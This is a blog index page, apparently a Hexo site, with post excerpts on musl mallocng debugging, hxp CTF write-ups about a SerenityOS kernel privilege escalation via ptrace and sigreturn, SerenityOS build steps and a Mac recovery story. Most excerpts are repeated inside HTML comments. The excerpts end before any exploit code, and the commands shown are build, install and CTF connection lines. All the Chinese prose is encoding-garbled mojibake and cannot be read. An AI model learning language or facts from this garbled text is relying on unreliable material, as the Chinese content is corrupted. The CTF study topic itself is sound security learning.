<p>åœ¨<code>/src/x64/</code>ä¸‹æ‰¾åˆ°ç¼–è¯‘å¥½çš„libc.so</p>
<p>é€šè¿‡patchelfå°†ld.soæ”¹æˆlibc.soå³å¯ï¼Œgdbè°ƒè¯•æ—¶åŠ ä¸Š<code>dir /path/to/musl-1.2.2/src/malloc/</code>å’Œ<code>dir /path/to/musl-1.2.2/src/malloc/mallocng</code>ä¾¿å¯æºç è°ƒè¯•ã€‚</p>
	
	</div>
  <a type="button" href="/2021/05/31/å€ŸåŠ©DefCon-Quals-2021çš„moooslå­¦ä¹ musl-mallocngï¼ˆæºç å®¡è®¡ç¯‡ï¼‰/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/21/hxpCTF2020-wisdom2ï¼šPtraceå‚æ•°æœªæ ¡éªŒå¼•å‘çš„SerenityOSå†…æ ¸ææƒ/" title="hxpCTF2020 wisdom2çš„è§£é¢˜æ€è·¯">hxpCTF2020 wisdom2ï¼šPtraceå‚æ•°æœªæ ¡éªŒå¼•å‘çš„SerenityOSå†…æ ¸ææƒ</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-21  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/228782" target="_blank" rel="noopener">hxpCTF2020 wisdom2ï¼šPtraceå‚æ•°æœªæ ¡éªŒå¼•å‘çš„SerenityOSå†…æ ¸ææƒ</a></p>
<p>æœ¬é¢˜æ¥æºäºhxpCTF 2020çš„wisdom2ï¼Œæ˜¯36c3 wisdomçš„å‡çº§ç‰ˆ<a href="https://www.anquanke.com/post/id/228782" target="_blank" rel="noopener">CVE-2019-20172ï¼š36C3 wisdomä¸­çš„SerenityOSå†…æ ¸ææƒ</a>ï¼Œè¯¥æ¼æ´å­˜åœ¨äºserenityOSåœ¨2020å¹´12æœˆ23æ—¥ä»¥å‰æäº¤çš„ç‰ˆæœ¬ã€‚<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/27/1619515380642-1619515380645.png" alt="title"><br>æ¼æ´å­˜åœ¨äºsys$ptrace()ä¸sys$sigreturn()æ–¹æ³•ï¼Œå…è®¸Userlandä¿®æ”¹Kernelandçš„å¯„å­˜å™¨ï¼Œè¿›ä¸€æ­¥å¯å®ç°å†…æ ¸ææƒã€‚é€šè¿‡ä¿®æ”¹eflagsçš„IOPLæ ‡å¿—ä½ï¼Œå¯å¯¹ç³»ç»ŸI/Oè®¾å¤‡è¿›è¡Œè¯»å†™æ“ä½œã€‚</p>
<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line">Oops, I did it again. :^)</span><br><span class="line"></span><br><span class="line">This is commit # 4232874270015d940a2ba62c113bcf12986a2151 with the attached patch applied. Flag is in &#x2F;dev&#x2F;hdb.</span><br><span class="line"></span><br><span class="line">Note that the setup of this task is perhaps a bit shaky: If you donâ€™t get a shell prompt within a few seconds after solving the proof of work, something is wrong. Each connection has a time limit of 10 minutes; you may contact us in case this causes problems for you.</span><br><span class="line"></span><br><span class="line">Download:</span><br><span class="line">wisdom2-c46f03732e9dceef.tar.xz (19.4 MiB)</span><br><span class="line"></span><br><span class="line">Connection:</span><br><span class="line">telnet 157.90.19.161 2323</span><br></pre></td></tr></table></figure>

<h1 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h1><p>æ‹‰å–å¯¹åº”æºç <a href="https://github.com/SerenityOS/serenity/tree/4232874270015d940a2ba62c113bcf12986a2151" target="_blank" rel="noopener">https://github.com/SerenityOS/serenity/tree/4232874270015d940a2ba62c113bcf12986a2151</a></p>
<p>æŒ‰ç…§<code>Documentation/BuildInstructions.md</code>å®‰è£…ä¾èµ–ï¼Œå¹¶ä¸”ç¼–è¯‘Toolchainå’ŒKernel</p>
<p>å…ˆæ‰“ä¸Špatch</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git apply &#x2F;path&#x2F;to&#x2F;hxp.patch</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘Toolchain</p>
	

	</div>
  <a type="button" href="/2021/05/21/hxpCTF2020-wisdom2ï¼šPtraceå‚æ•°æœªæ ¡éªŒå¼•å‘çš„SerenityOSå†…æ ¸ææƒ/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/228782" target="_blank" rel="noopener">hxpCTF2020 wisdom2ï¼šPtraceå‚æ•°æœªæ ¡éªŒå¼•å‘çš„SerenityOSå†…æ ¸ææƒ</a></p>
<p>æœ¬é¢˜æ¥æºäºhxpCTF 2020çš„wisdom2ï¼Œæ˜¯36c3 wisdomçš„å‡çº§ç‰ˆ<a href="https://www.anquanke.com/post/id/228782" target="_blank" rel="noopener">CVE-2019-20172ï¼š36C3 wisdomä¸­çš„SerenityOSå†…æ ¸ææƒ</a>ï¼Œè¯¥æ¼æ´å­˜åœ¨äºserenityOSåœ¨2020å¹´12æœˆ23æ—¥ä»¥å‰æäº¤çš„ç‰ˆæœ¬ã€‚<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/27/1619515380642-1619515380645.png" alt="title"><br>æ¼æ´å­˜åœ¨äºsys$ptrace()ä¸sys$sigreturn()æ–¹æ³•ï¼Œå…è®¸Userlandä¿®æ”¹Kernelandçš„å¯„å­˜å™¨ï¼Œè¿›ä¸€æ­¥å¯å®ç°å†…æ ¸ææƒã€‚é€šè¿‡ä¿®æ”¹eflagsçš„IOPLæ ‡å¿—ä½ï¼Œå¯å¯¹ç³»ç»ŸI/Oè®¾å¤‡è¿›è¡Œè¯»å†™æ“ä½œã€‚</p>
<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line">Oops, I did it again. :^)</span><br><span class="line"></span><br><span class="line">This is commit # 4232874270015d940a2ba62c113bcf12986a2151 with the attached patch applied. Flag is in &#x2F;dev&#x2F;hdb.</span><br><span class="line"></span><br><span class="line">Note that the setup of this task is perhaps a bit shaky: If you donâ€™t get a shell prompt within a few seconds after solving the proof of work, something is wrong. Each connection has a time limit of 10 minutes; you may contact us in case this causes problems for you.</span><br><span class="line"></span><br><span class="line">Download:</span><br><span class="line">wisdom2-c46f03732e9dceef.tar.xz (19.4 MiB)</span><br><span class="line"></span><br><span class="line">Connection:</span><br><span class="line">telnet 157.90.19.161 2323</span><br></pre></td></tr></table></figure>

<h1 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h1><p>æ‹‰å–å¯¹åº”æºç <a href="https://github.com/SerenityOS/serenity/tree/4232874270015d940a2ba62c113bcf12986a2151" target="_blank" rel="noopener">https://github.com/SerenityOS/serenity/tree/4232874270015d940a2ba62c113bcf12986a2151</a></p>
<p>æŒ‰ç…§<code>Documentation/BuildInstructions.md</code>å®‰è£…ä¾èµ–ï¼Œå¹¶ä¸”ç¼–è¯‘Toolchainå’ŒKernel</p>
<p>å…ˆæ‰“ä¸Špatch</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git apply &#x2F;path&#x2F;to&#x2F;hxp.patch</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘Toolchain</p>
	
	</div>
  <a type="button" href="/2021/05/21/hxpCTF2020-wisdom2ï¼šPtraceå‚æ•°æœªæ ¡éªŒå¼•å‘çš„SerenityOSå†…æ ¸ææƒ/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/01/31/CVE-2019-20172ï¼š36C3 wisdomä¸­çš„SerenityOSå†…æ ¸ææƒ/" title="HXP 36C3 CTF wisdomçš„è§£é¢˜æ€è·¯">CVE-2019-20172ï¼š36C3 wisdomä¸­çš„SerenityOSå†…æ ¸ææƒ</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-01-31  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/228782" target="_blank" rel="noopener">CVE-2019-20172ï¼š36C3 wisdomä¸­çš„SerenityOSå†…æ ¸ææƒ</a></p>
<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/01/13/1610505381037-1610505381039.png" alt="title"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line"></span><br><span class="line">I really, really like this lovingly handcrafted OS. It would be a shame if something happened to itâ€¦</span><br><span class="line"></span><br><span class="line">This is commit # fd06164fa0cee25ab69c701897de0a4bd03537d6 with the attached patch applied. Flag is in &#x2F;dev&#x2F;hdb.</span><br><span class="line"></span><br><span class="line">Note that the setup of this task is perhaps a bit shaky: If you donâ€™t get a shell prompt within a few seconds after solving the proof of work, something is wrong. Each connection has a time limit of 5 minutes and 30 seconds of CPU time, whichever happens first; you may contact us in case this causes problems for you.</span><br><span class="line">Download:</span><br><span class="line"></span><br><span class="line">wisdom-601e2adb9f44b61f.tar.xz (9.5 MiB)</span><br><span class="line">Connection:</span><br><span class="line"></span><br><span class="line">nc 88.198.156.191 2323</span><br></pre></td></tr></table></figure>

<h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>ç¼–è¯‘è¿‡ç¨‹å‚è€ƒ<a href="https://sung3r.github.io/2021/01/31/%E7%BC%96%E8%AF%91SerenityOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" target="_blank" rel="noopener">ç¼–è¯‘SerenityOSæ“ä½œç³»ç»Ÿ</a>è¿™ç¯‡ç¬”è®°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 20.04</span><br><span class="line">gcc 10.2.0</span><br><span class="line">cmake 3.19.2</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘expï¼Œåœ¨<code>Userland/</code>æ”¾expæºç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit .&#x2F;Userland&#x2F;test.cpp</span><br></pre></td></tr></table></figure>

<p>å…ˆæ‰§è¡Œä¸€é<code>../Meta/refresh-serenity-qtcreator.sh</code>ï¼Œæç¤º<code>Serenety root not set.</code>ï¼Œè®¾ç½®<code>SERENITY_ROOT</code></p>
	

	</div>
  <a type="button" href="/2021/01/31/CVE-2019-20172ï¼š36C3 wisdomä¸­çš„SerenityOSå†…æ ¸ææƒ/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/228782" target="_blank" rel="noopener">CVE-2019-20172ï¼š36C3 wisdomä¸­çš„SerenityOSå†…æ ¸ææƒ</a></p>
<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/01/13/1610505381037-1610505381039.png" alt="title"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line"></span><br><span class="line">I really, really like this lovingly handcrafted OS. It would be a shame if something happened to itâ€¦</span><br><span class="line"></span><br><span class="line">This is commit # fd06164fa0cee25ab69c701897de0a4bd03537d6 with the attached patch applied. Flag is in &#x2F;dev&#x2F;hdb.</span><br><span class="line"></span><br><span class="line">Note that the setup of this task is perhaps a bit shaky: If you donâ€™t get a shell prompt within a few seconds after solving the proof of work, something is wrong. Each connection has a time limit of 5 minutes and 30 seconds of CPU time, whichever happens first; you may contact us in case this causes problems for you.</span><br><span class="line">Download:</span><br><span class="line"></span><br><span class="line">wisdom-601e2adb9f44b61f.tar.xz (9.5 MiB)</span><br><span class="line">Connection:</span><br><span class="line"></span><br><span class="line">nc 88.198.156.191 2323</span><br></pre></td></tr></table></figure>

<h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>ç¼–è¯‘è¿‡ç¨‹å‚è€ƒ<a href="https://sung3r.github.io/2021/01/31/%E7%BC%96%E8%AF%91SerenityOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" target="_blank" rel="noopener">ç¼–è¯‘SerenityOSæ“ä½œç³»ç»Ÿ</a>è¿™ç¯‡ç¬”è®°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 20.04</span><br><span class="line">gcc 10.2.0</span><br><span class="line">cmake 3.19.2</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘expï¼Œåœ¨<code>Userland/</code>æ”¾expæºç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit .&#x2F;Userland&#x2F;test.cpp</span><br></pre></td></tr></table></figure>

<p>å…ˆæ‰§è¡Œä¸€é<code>../Meta/refresh-serenity-qtcreator.sh</code>ï¼Œæç¤º<code>Serenety root not set.</code>ï¼Œè®¾ç½®<code>SERENITY_ROOT</code></p>
	
	</div>
  <a type="button" href="/2021/01/31/CVE-2019-20172ï¼š36C3 wisdomä¸­çš„SerenityOSå†…æ ¸ææƒ/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/01/31/ç¼–è¯‘SerenityOSæ“ä½œç³»ç»Ÿ/" title="SerenityOSç¼–è¯‘æ­¥éª¤">ç¼–è¯‘SerenityOSæ“ä½œç³»ç»Ÿ</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-01-31  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a href="https://github.com/SerenityOS/serenity" target="_blank" rel="noopener">SerenityOS</a>æ˜¯ä¸€å¥—ç”¨äºx86è®¡ç®—æœºçš„å›¾å½¢åŒ–ç±»Unixæ“ä½œç³»ç»Ÿã€‚ä¸ºäº†è§£å†³hxp 36C3 CTFçš„wisdomè¿™é“é¢˜ï¼Œé¦–å…ˆéœ€è¦ç¼–è¯‘å‡ºè¯¥ç³»ç»Ÿï¼Œä»¥ä¸‹æ˜¯ç¼–è¯‘æ­¥éª¤ã€‚<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/01/31/1612088652182-1612088652218.png" alt="title"></p>
<h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 20.04</span><br><span class="line">gcc 10.2.0</span><br><span class="line">cmake 3.19.2</span><br></pre></td></tr></table></figure>

<p>å®‰è£…ubuntuçš„dependencies</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install build-essential curl libmpfr-dev libmpc-dev libgmp-dev e2fsprogs qemu-system-i386 qemu-utils</span><br></pre></td></tr></table></figure>

<p>ä¿è¯gccç‰ˆæœ¬&gt;=10</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ubuntu-toolchain-r&#x2F;test</span><br><span class="line">sudo apt install gcc-10 g++-10</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;gcc gcc &#x2F;usr&#x2F;bin&#x2F;gcc-10 100 --slave &#x2F;usr&#x2F;bin&#x2F;g++ g++ &#x2F;usr&#x2F;bin&#x2F;g++-10</span><br></pre></td></tr></table></figure>

<p>ä¿è¯cmakeç‰ˆæœ¬&gt;=3.16ï¼Œå®˜ç½‘ä¸‹è½½<code>3.19.2</code>æœ€æ–°ç‰ˆæœ¬ç¼–è¯‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;bootstrap</span><br><span class="line">make -j8</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1>
	

	</div>
  <a type="button" href="/2021/01/31/ç¼–è¯‘SerenityOSæ“ä½œç³»ç»Ÿ/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a href="https://github.com/SerenityOS/serenity" target="_blank" rel="noopener">SerenityOS</a>æ˜¯ä¸€å¥—ç”¨äºx86è®¡ç®—æœºçš„å›¾å½¢åŒ–ç±»Unixæ“ä½œç³»ç»Ÿã€‚ä¸ºäº†è§£å†³hxp 36C3 CTFçš„wisdomè¿™é“é¢˜ï¼Œé¦–å…ˆéœ€è¦ç¼–è¯‘å‡ºè¯¥ç³»ç»Ÿï¼Œä»¥ä¸‹æ˜¯ç¼–è¯‘æ­¥éª¤ã€‚<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/01/31/1612088652182-1612088652218.png" alt="title"></p>
<h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 20.04</span><br><span class="line">gcc 10.2.0</span><br><span class="line">cmake 3.19.2</span><br></pre></td></tr></table></figure>

<p>å®‰è£…ubuntuçš„dependencies</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install build-essential curl libmpfr-dev libmpc-dev libgmp-dev e2fsprogs qemu-system-i386 qemu-utils</span><br></pre></td></tr></table></figure>

<p>ä¿è¯gccç‰ˆæœ¬&gt;=10</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ubuntu-toolchain-r&#x2F;test</span><br><span class="line">sudo apt install gcc-10 g++-10</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;gcc gcc &#x2F;usr&#x2F;bin&#x2F;gcc-10 100 --slave &#x2F;usr&#x2F;bin&#x2F;g++ g++ &#x2F;usr&#x2F;bin&#x2F;g++-10</span><br></pre></td></tr></table></figure>

<p>ä¿è¯cmakeç‰ˆæœ¬&gt;=3.16ï¼Œå®˜ç½‘ä¸‹è½½<code>3.19.2</code>æœ€æ–°ç‰ˆæœ¬ç¼–è¯‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;bootstrap</span><br><span class="line">make -j8</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1>
	
	</div>
  <a type="button" href="/2021/01/31/ç¼–è¯‘SerenityOSæ“ä½œç³»ç»Ÿ/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/05/01/æŸæ¬¡å¼ºåˆ¶å…³æœºåå¼•å‘çš„è¡€æ¡ˆ/" title="è®°å½•Macç¯å¢ƒé…ç½®è¿‡ç¨‹">æŸæ¬¡å¼ºåˆ¶å…³æœºåå¼•å‘çš„è¡€æ¡ˆ</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-05-01  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h1 id="å¼ºåˆ¶é‡å¯åæ— é™èŠèŠ±"><a href="#å¼ºåˆ¶é‡å¯åæ— é™èŠèŠ±" class="headerlink" title="å¼ºåˆ¶é‡å¯åæ— é™èŠèŠ±"></a>å¼ºåˆ¶é‡å¯åæ— é™èŠèŠ±</h1><p>å‰ä¸¤å¤©å°†macå…³é—­ï¼Œç­‰åŠå¤©æ²¡å…³ä¸Šï¼Œç´¢æ€§ç›´æ¥å¼ºåˆ¶é‡å¯äº†ï¼Œç­‰å†å¼€æœºçš„æ—¶å€™ã€‚ã€‚ã€‚å¥”æºƒäº†ï¼Œä¸€è‡´å¡åœ¨å¼€æœºè¿›åº¦æ¡ã€‚</p>
<p>åæ¥åŸºæœ¬ä¸Šèƒ½å°è¯•çš„æ–¹æ³•éƒ½å°è¯•äº†ã€‚ã€‚ã€‚å¤§è‡´è¿™å‡ ç§<br>1.å¼€æœºæŒ‰ä½<code>command + R</code>é”®ï¼Œè¿›å…¥macOSæ¢å¤ç•Œé¢ï¼Œæ‰“å¼€ç»ˆç«¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#è¿›å…¥ç¼“å­˜ç›®å½•</span><br><span class="line">$ cd &#x2F;Volumes&#x2F;Macintosh&#x2F;var&#x2F;db&#x2F;caches&#x2F;opendirectory&#x2F;</span><br><span class="line">#åˆ é™¤ç¼“å­˜æ•°æ®åº“</span><br><span class="line">$ mv .&#x2F;mbr_cache .&#x2F;mar_cache-old</span><br></pre></td></tr></table></figure>
<p>ä¸è¡Œã€‚ã€‚ã€‚<br>2.é‡ç½®PRAMï¼šå¼€æœºæŒ‰ä½<code>Control+Command</code>å¹¶ä¿æŒ3ç§’ï¼Œè¯•äº†ä¸è¡Œ<br>3.é‡ç½®NVRemï¼šå¼€æœºæŒ‰ä½<code>Option+Command+R+P</code>å¹¶ä¿æŒ30ç§’ï¼Œä¹Ÿä¸è¡Œ<br>4.å¼€æœº<code>Command+S</code>ï¼Œå‡ºç°å‘½ä»¤è¡Œæç¤ºç¬¦åè¾“å…¥ä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -uw &#x2F; </span><br><span class="line">mv &#x2F;var&#x2F;db&#x2F;.AppleSetupDone &#x2F;var&#x2F;db&#x2F;.AppleSetupDone-old</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p>ä¾æ—§ä¸è¡Œ<br>5.å¼€æœºæŒ‰ä½<code>shift</code>ï¼Œè²Œä¼¼å®‰å…¨æ¨¡å¼ï¼Œè¿›å»æœ‰safarièƒ½è”ç½‘æŸ¥èµ„æ–™ï¼Œæ²¡ç”¨ã€‚ã€‚ã€‚<br>6.å¼€æœºæŒ‰ä½<code>D</code>ï¼Œç¡¬ä»¶è‡ªæ£€ï¼Œæ²¡æ£€æµ‹åˆ°å•¥é”™è¯¯ã€‚ã€‚<br>7.å¼€æœºæŒ‰ä½<code>command + R</code>é”®ï¼Œè¿›å…¥ç£ç›˜å·¥å…·ï¼Œæ€¥æ•‘ï¼Œç£ç›˜æ£€æµ‹æ­£å¸¸ï¼Œæ²¡æ¡ƒå­ç”¨ã€‚ã€‚ã€‚<br>8.æ²¡æ³•å¼€æœºå¯ä»¥å…ˆè¯•è¯•è¿™ä¸ªæ–¹æ³•<a href="https://support.apple.com/zh-cn/HT201295" target="_blank" rel="noopener">å¦‚ä½•é‡ç½®Macçš„SMC</a></p>
<p>æƒ³èµ·ä»¥å‰é—®è¿‡å®¢æœï¼Œæ²¡å¼€å¯ç£ç›˜åŠ å¯†çš„æƒ…å†µä¸‹æ˜¯èƒ½ç›´æ¥è¦†ç›–å®‰è£…ç³»ç»Ÿçš„ï¼Œä¸éœ€è¦æŠ¹é™¤ï¼Œæ•°æ®ä¸ä¼šä¸¢å¤±ã€‚å°±è¿™æ ·å‚»å‚»çš„èŠ±äº†ä¸€ä¸ªå¤šå°æ—¶å®‰è£…ç³»ç»Ÿï¼Œé‡å¯è¿‡åï¼Œè¿˜æ˜¯ä¸€æ ·çš„æƒ…å†µã€‚ã€‚ã€‚é†‰äº†ï¼Œè¿™åŠæ³•ä¹Ÿä¸çµäº†</p>
<p>æ²¡åŠæ³•ï¼Œç›´æ¥æŠ¹é™¤é‡è£…ï¼Œå…ˆè¿›æ¢å¤æ¨¡å¼æŠŠé‡è¦èµ„æ–™æå‡ºæ¥ï¼Œæ¯•ç«Ÿæ•°æ®æ— ä»·ã€‚åœ¨<code>ç£ç›˜å·¥å…·-&gt;æ–‡ä»¶-&gt;æ–°å»ºæ˜ åƒ-&gt;æ¥è‡ªæ–‡ä»¶å¤¹çš„æ˜ åƒ...</code>é€‰ä¸­éœ€è¦ä¿å­˜çš„æ–‡ä»¶å¤¹ï¼Œåç¼€å¡«dmgï¼Œå­˜å‚¨åˆ°Uç›˜æˆ–ç§»åŠ¨ç¡¬ç›˜ä¸Šã€‚</p>
<p>ä¸€ä¸ªå¤šå°æ—¶åã€‚ã€‚ã€‚ç»ˆäºè£…å¥½äº†ï¼Œä½†æ‰€æœ‰çš„ç¯å¢ƒéƒ½ä¸¢å¤±äº†ã€‚ã€‚ã€‚</p>
	

	</div>
  <a type="button" href="/2020/05/01/æŸæ¬¡å¼ºåˆ¶å…³æœºåå¼•å‘çš„è¡€æ¡ˆ/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h1 id="å¼ºåˆ¶é‡å¯åæ— é™èŠèŠ±"><a href="#å¼ºåˆ¶é‡å¯åæ— é™èŠèŠ±" class="headerlink" title="å¼ºåˆ¶é‡å¯åæ— é™èŠèŠ±"></a>å¼ºåˆ¶é‡å¯åæ— é™èŠèŠ±</h1><p>å‰ä¸¤å¤©å°†macå…³é—­ï¼Œç­‰åŠå¤©æ²¡å…³ä¸Šï¼Œç´¢æ€§ç›´æ¥å¼ºåˆ¶é‡å¯äº†ï¼Œç­‰å†å¼€æœºçš„æ—¶å€™ã€‚ã€‚ã€‚å¥”æºƒäº†ï¼Œä¸€è‡´å¡åœ¨å¼€æœºè¿›åº¦æ¡ã€‚</p>
<p>åæ¥åŸºæœ¬ä¸Šèƒ½å°è¯•çš„æ–¹æ³•éƒ½å°è¯•äº†ã€‚ã€‚ã€‚å¤§è‡´è¿™å‡ ç§<br>1.å¼€æœºæŒ‰ä½<code>command + R</code>é”®ï¼Œè¿›å…¥macOSæ¢å¤ç•Œé¢ï¼Œæ‰“å¼€ç»ˆç«¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#è¿›å…¥ç¼“å­˜ç›®å½•</span><br><span class="line">$ cd &#x2F;Volumes&#x2F;Macintosh&#x2F;var&#x2F;db&#x2F;caches&#x2F;opendirectory&#x2F;</span><br><span class="line">#åˆ é™¤ç¼“å­˜æ•°æ®åº“</span><br><span class="line">$ mv .&#x2F;mbr_cache .&#x2F;mar_cache-old</span><br></pre></td></tr></table></figure>
